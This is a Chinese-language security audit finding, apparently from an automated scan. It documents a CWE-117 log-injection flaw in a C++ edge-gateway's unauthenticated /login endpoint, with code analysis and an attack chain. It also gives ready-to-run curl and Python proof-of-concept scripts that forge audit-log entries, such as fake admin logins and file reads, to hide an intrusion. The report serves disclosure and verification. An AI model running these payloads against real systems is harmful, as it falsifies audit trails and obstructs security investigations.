# VULN-DF-MAIN-003: 审计日志函数未过滤换行符，攻击者可通过 HTTP 请求体注入伪造日志条目

**严重性**: High | **CWE**: CWE-117 (Improper Output Neutralization for Logs) | **置信度**: 85/100
**位置**: `src/main.cpp:40-51` @ `lambda(POST /login)`

---

## 1. 漏洞细节

本漏洞存在于 `AuditLog::event()` 日志记录函数中。该函数定义在 `include/audit_log.hpp:11-15`，将 `user`、`action`、`detail` 三个参数通过 C++ 流插入运算符（`<<`）直接写入日志文件，**未对任何参数进行换行符（`\n`、`\r`）转义或特殊字符过滤**。

在 `src/main.cpp` 的 POST `/login` 路由处理函数中（第 40-52 行），攻击者控制的 HTTP 请求体（`request.body`）被直接作为 `detail` 参数传递给 `audit.event()`。由于 HTTP 请求体可以包含任意字符（包括换行符），攻击者可以在请求体中注入 `\n` 字符，从而在审计日志文件中创建伪造的日志条目。

此外，`username` 参数（来自 URL 查询参数 `user`）也被传递给 `audit.event()` 作为 `user` 参数。虽然当前 HTTP 解析器的 URL 提取方式（`stream >> target`，以空白字符分隔）限制了通过 URL 查询参数注入原始换行符的能力，但请求体向量完全可行且无任何防护。

受影响的路由共有 4 个：`POST /login`、`GET /files`、`POST /debug/ping`、`GET /admin/export`，它们均将外部可控数据传递给 `audit.event()` 且无任何清洗处理。其中 `POST /login` 的请求体向量最为危险，因为请求体可以包含任意长度的原始换行字符。

**漏洞根因**：`AuditLog::event()` 函数缺乏对日志输出内容的净化处理（Log Sanitization），违反了 CWE-117 的安全要求——所有写入日志的用户可控数据应当进行换行符和特殊字符的转义或剥离。

## 2. 漏洞代码

**文件**: `include/audit_log.hpp` (行 11-15) — 漏洞 Sink 点

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user       // ← 用户可控数据直接写入
         << " action=" << action
         << " detail=" << detail << "\n";                 // ← 无换行符转义，detail 可含 \n
}
```

**文件**: `src/main.cpp` (行 40-52) — POST /login 路由（主要攻击入口）

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");    // 行41: 从 URL 查询参数提取，攻击者可控
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);  // 行43: SINK — username 和 request.body 均为污点数据

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);         // 行50: 若认证成功，username 再次写入日志
    return text(200, "session=" + token + "\n");
});
```

**文件**: `src/http_server.cpp` (行 65-67) — 请求体解析（无过滤）

```cpp
std::ostringstream body;
body << stream.rdbuf();       // 读取剩余流内容，保留所有字符（包括 \n、\r）
request.body = body.str();    // 请求体原封不动传递给路由处理器
```

**逐段分析**：

1. **`audit_log.hpp:11-15`**：`event()` 函数使用 `out_ <<` 将三个参数直接写入日志文件。唯一的换行符是末尾的 `"\n"`，用于分隔日志条目。但如果 `user` 或 `detail` 参数本身包含 `\n`，则会在日志中产生额外的行，形成伪造条目。
2. **`main.cpp:43`**：`request.body`（HTTP 请求体）作为 `detail` 参数传入。请求体由 `http_server.cpp:65-67` 解析，保留了所有原始字符。
3. **`http_server.cpp:65-67`**：`stream.rdbuf()` 将头部之后的所有数据读入 `body`，不做任何字符过滤或转义。攻击者发送的 `\n` 字符会被完整保留。

## 3. 完整攻击链路

```
[入口点] HTTP POST /login 请求 (网络攻击者 → 服务器:8080)
↓ 攻击者构造包含恶意换行符的 HTTP 请求体
[HTTP 解析] HttpServer::parseRequest()@src/http_server.cpp:42
↓ stream.rdbuf() 读取请求体，保留所有字符包括 \n (http_server.cpp:65-67)
[路由分发] handlers_.find() → lambda(POST /login)@src/main.cpp:40
↓ request.body 原封不动传递给路由处理函数
[数据提取] queryValue(request, "user")@src/main.cpp:41
↓ username 从 URL 查询参数提取（次要向量）
[漏洞触发] audit.event(username, "login-attempt", request.body)@src/main.cpp:43
↓ username → user 参数, request.body → detail 参数
[日志写入] out_ << user << action << detail@include/audit_log.hpp:12-14
↓ detail 中的 \n 产生伪造日志行，写入 edge-gateway.audit.log
[攻击完成] 伪造的日志条目出现在审计日志文件中
```

**攻击链路详细说明**：

1. **入口点**：攻击者向服务器发送 HTTP POST 请求到 `/login` 端点。该端点无需任何认证即可访问（`http_server.cpp:105-133` 中的 `accept` → `parseRequest` → `handler` 流程无认证检查）。

2. **HTTP 解析**（`http_server.cpp:42-69`）：`parseRequest()` 方法解析原始 HTTP 请求。URL 查询参数通过 `parseQuery()` 提取（无 URL 解码），请求体通过 `stream.rdbuf()` 提取。**关键**：请求体保留了所有原始字符，包括换行符。

3. **路由处理**（`main.cpp:40-52`）：POST `/login` 路由处理器接收解析后的 `HttpRequest` 对象。第 41 行提取 `username`，第 43 行调用 `audit.event(username, "login-attempt", request.body)`。

4. **日志写入**（`audit_log.hpp:11-15`）：`event()` 函数将参数直接写入日志文件。`request.body` 中的换行符会在日志中产生新的行，攻击者可以精心构造这些行的内容使其看起来像合法的日志条目。

**链路可达性验证**：
- ✅ 入口点可达：POST `/login` 直接暴露在网络端口上，无认证要求
- ✅ 数据传递无阻断：`request.body` 从解析到 `audit.event()` 之间无任何清洗、验证或过滤
- ✅ Sink 点确认：`out_ <<` 直接写入文件，无转义处理
- ✅ 无缓解措施：代码中不存在任何换行符剥离、字符编码或输入长度限制

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。攻击者只需能够向目标服务器的 HTTP 端口发送 TCP 数据包即可发起攻击，无需任何身份认证或特殊权限。

**攻击向量**: 通过 HTTP POST 请求体注入恶意换行符。攻击者向 `/login` 端点发送包含 `\n` 字符的请求体，利用 `AuditLog::event()` 缺乏输出净化的缺陷在审计日志中创建伪造条目。

**利用难度**: 低

### 攻击步骤

1. **侦察**：确认目标服务器运行 edge-gateway 服务（默认端口 8080），确认 `/login` 端点可用。
2. **构造恶意请求**：创建 HTTP POST 请求，在请求体中注入换行符和伪造的日志条目内容。例如，请求体为：
   ```
   normal-data\n1700000000 user=admin action=login-success detail=privilege-escalation
   ```
3. **发送请求**：向 `POST /login?user=test&password=wrong` 发送构造好的请求。
4. **验证结果**：检查 `edge-gateway.audit.log` 文件，确认伪造的日志条目已写入。伪造条目格式与合法条目一致，难以通过简单检查区分。
5. **利用效果**：
   - 伪造管理员登录成功记录，掩盖真实攻击行为
   - 注入虚假审计事件，干扰安全分析
   - 在 SIEM 系统中产生误导性的告警或掩盖真实告警

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | 需要网络访问   | 攻击者需能访问目标服务器的 HTTP 端口（默认 8080）。服务器绑定 `INADDR_ANY`，监听所有网络接口。 |
| 认证要求   | 无需认证       | POST `/login` 端点无需任何认证即可访问。日志记录发生在认证检查之前（main.cpp:43 在 45 行之前）。 |
| 配置依赖   | 无特殊配置要求 | 服务启动即可利用，无需特定配置选项。日志文件路径硬编码为 `edge-gateway.audit.log`。           |
| 环境依赖   | 无特殊依赖     | 标准 C++ 编译环境即可。不依赖特定操作系统特性或编译选项。                                      |
| 时序条件   | 无时序要求     | 每次请求都会触发日志写入，不存在竞态条件或时序窗口限制。                                       |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                             |
| -------- | ---- | ------------------------------------------------------------------------------------------------ |
| 机密性   | 低   | 日志注入本身不直接泄露敏感数据。但伪造的日志可能干扰安全团队对真实数据泄露事件的检测和响应。       |
| 完整性   | 高   | 审计日志的完整性被严重破坏。攻击者可以伪造、篡改审计记录，创建虚假的合法操作记录或掩盖恶意行为痕迹。 |
| 可用性   | 低   | 大量注入的日志条目可能导致日志文件膨胀，但不会直接导致服务中断。                                   |

**影响范围**: 

- **直接影响**：审计日志文件 `edge-gateway.audit.log` 的完整性和可信度被破坏。所有 4 个使用 `audit.event()` 的路由均受影响。
- **间接影响**：如果组织依赖此审计日志进行安全事件调查、合规审计或入侵检测（SIEM），则攻击者可以通过伪造日志来：
  - 掩盖真实的攻击行为（如未授权访问、数据窃取）
  - 创建虚假的管理员操作记录，误导调查方向
  - 规避基于日志分析的安全告警规则
- **横向扩展**：如果日志被集中收集到 SIEM 系统，伪造条目会污染中央日志存储，影响范围扩大到整个安全监控体系。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请勿用于非法目的。

### PoC 1: 使用 curl 命令（基础验证）

```bash
# 向 /login 发送包含换行符注入的请求体
# 请求体中 \n 后跟伪造的日志条目
curl -X POST "http://TARGET:8080/login?user=testuser&password=wrongpass" \
  -H "Content-Type: text/plain" \
  --data-binary $'normal-login-data\n9999999999 user=admin action=login-success detail=forged-admin-entry'
```

### PoC 2: Python 脚本（精确控制）

```python
#!/usr/bin/env python3
"""
日志注入 PoC — 仅供安全测试使用
验证 AuditLog::event() 的 CWE-117 日志注入漏洞
"""
import socket
import sys

def exploit(target_host, target_port=8080):
    # 构造伪造的日志条目
    forged_entry = "9999999999 user=admin action=login-success detail=privilege-escalation-complete"
    
    # 构造恶意请求体：正常数据 + 换行符 + 伪造日志条目
    malicious_body = f"normal-data\n{forged_entry}"
    
    # 构造完整的 HTTP 请求
    request = (
        f"POST /login?user=testuser&password=wrongpass HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"Content-Length: {len(malicious_body)}\r\n"
        f"Content-Type: text/plain\r\n"
        f"\r\n"
        f"{malicious_body}"
    )
    
    # 发送请求
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((target_host, target_port))
        sock.sendall(request.encode())
        response = sock.recv(4096).decode()
        print(f"[*] 服务器响应:\n{response}")
        print(f"\n[*] 注入的伪造日志条目:")
        print(f"    {forged_entry}")
        print(f"\n[!] 请检查 edge-gateway.audit.log 文件确认伪造条目是否写入")
    except Exception as e:
        print(f"[-] 连接失败: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    exploit(host, port)
```

### PoC 3: 多条目注入（高级利用）

```python
#!/usr/bin/env python3
"""
高级日志注入 PoC — 仅供安全测试使用
注入多条伪造日志条目，模拟完整的攻击掩盖场景
"""
import socket

def multi_inject(target_host, target_port=8080):
    # 注入多条伪造日志，模拟管理员操作序列
    forged_entries = [
        "1700000001 user=admin action=login-success detail=admin-session-start",
        "1700000002 user=admin action=read-file detail=/etc/shadow",
        "1700000003 user=admin action=export detail=full-database-dump",
        "1700000004 user=admin action=logout detail=normal-shutdown",
    ]
    
    # 将所有伪造条目用换行符连接
    malicious_body = "x\n" + "\n".join(forged_entries)
    
    request = (
        f"POST /login?user=attacker&password=test HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"Content-Length: {len(malicious_body)}\r\n"
        f"\r\n"
        f"{malicious_body}"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.sendall(request.encode())
    response = sock.recv(4096).decode()
    sock.close()
    
    print("[*] 已注入 4 条伪造审计日志条目")
    print("[*] 预期日志输出:")
    print("    --- 合法条目 ---")
    print("    <timestamp> user=attacker action=login-attempt detail=x")
    print("    --- 伪造条目 ---")
    for entry in forged_entries:
        print(f"    {entry}")

multi_inject("127.0.0.1", 8080)
```

**使用说明**: 

1. 确保目标 edge-gateway 服务正在运行
2. 执行 PoC 脚本向 `/login` 端点发送恶意请求
3. 检查服务器当前目录下的 `edge-gateway.audit.log` 文件
4. 确认伪造的日志条目已出现在日志文件中，且格式与合法条目一致

**预期结果**: 

日志文件 `edge-gateway.audit.log` 中将出现如下内容：

```
1718668800 user=testuser action=login-attempt detail=normal-data
9999999999 user=admin action=login-success detail=forged-admin-entry
```

第二行是攻击者伪造的日志条目，其格式与合法条目完全一致，无法通过简单的格式检查区分。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / 任何支持 POSIX socket 的系统)
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- 依赖: 标准 C++ 库（无第三方依赖）
- 工具: curl、Python 3.6+（用于 PoC 验证）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 使用 CMake 构建（如果项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或直接使用 g++ 编译
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/http_server.cpp src/user_store.cpp src/file_cache.cpp src/diagnostics.cpp
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需额外配置文件。服务启动后会在当前目录创建 `edge-gateway.audit.log` 日志文件，并监听指定端口。`data/` 目录需要存在（`FileCache` 初始化时使用）。

### 验证步骤

1. 启动 edge-gateway 服务
2. 先发送一个正常请求作为对照：
   ```bash
   curl -X POST "http://127.0.0.1:8080/login?user=alice&password=secret" -d "normal-body"
   ```
3. 查看日志文件确认正常条目格式：
   ```bash
   cat edge-gateway.audit.log
   ```
4. 发送包含日志注入的恶意请求：
   ```bash
   curl -X POST "http://127.0.0.1:8080/login?user=test&password=wrong" \
     --data-binary $'normal\n9999999999 user=admin action=login-success detail=forged'
   ```
5. 再次查看日志文件，对比正常条目和伪造条目：
   ```bash
   cat edge-gateway.audit.log
   ```

### 预期结果

日志文件内容将显示：

```
<正常时间戳> user=alice action=login-attempt detail=normal-body
<正常时间戳> user=test action=login-attempt detail=normal
9999999999 user=admin action=login-success detail=forged
```

第三行是注入的伪造条目。注意其时间戳 `9999999999` 是攻击者指定的值，`user=admin` 和 `action=login-success` 使该条目看起来像一次合法的管理员登录成功记录。在真实场景中，攻击者可以使用合理的时间戳值，使伪造条目更难被发现。
